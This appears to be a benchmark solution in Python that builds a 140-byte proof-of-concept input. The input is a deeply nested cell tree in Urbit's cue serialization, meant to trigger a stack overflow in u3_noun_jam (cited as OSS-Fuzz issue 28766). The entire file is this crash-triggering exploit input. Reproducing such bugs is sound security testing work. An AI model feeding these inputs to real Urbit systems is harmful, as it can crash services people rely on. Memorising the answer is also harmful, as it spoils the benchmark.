class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to OSS-Fuzz Issue 28766 in Arvo (Urbit), which is a 
        Stack-overflow in _u3_noun_jam. This typically occurs when processing a noun with 
        excessive recursion depth.
        
        We construct a "Left-Deep" binary tree of cells to maximize stack depth during traversal
        within the 140-byte limit.
        
        Format: Urbit 'cue' serialization bit stream (Little Endian).
        - Cell tag: '1' followed by '0' (2 bits)
        - Atom 0: '0' followed by '0' (2 bits)
        
        Structure: [[[[... 0] 0] 0] ... 0]
        Encoding sequence:
        1. N times '10' (Open N cells)
        2. '00' (Innermost Head is Atom 0)
        3. N times '00' (Close N tails with Atom 0)
        
        Total bits = 2*N + 2 + 2*N = 4*N + 2
        Constraint: 140 bytes = 1120 bits
        4N + 2 <= 1120 => 4N <= 1118 => N = 279
        """
        N = 279
        bits = []
        
        # 1. Open N cells (Heads)
        # Sequence: 1, 0
        for _ in range(N):
            bits.append(1)
            bits.append(0)
            
        # 2. Innermost Head (Atom 0)
        # Sequence: 0, 0
        bits.append(0)
        bits.append(0)
        
        # 3. Close N tails (Atom 0)
        # Sequence: 0, 0
        for _ in range(N):
            bits.append(0)
            bits.append(0)
            
        # 4. Pack bits into bytes (Little Endian)
        # Bit stream starts at LSB of first byte.
        output = bytearray(140)
        for i, bit in enumerate(bits):
            if bit:
                byte_idx = i // 8
                bit_idx = i % 8
                output[byte_idx] |= (1 << bit_idx)
                
        return bytes(output)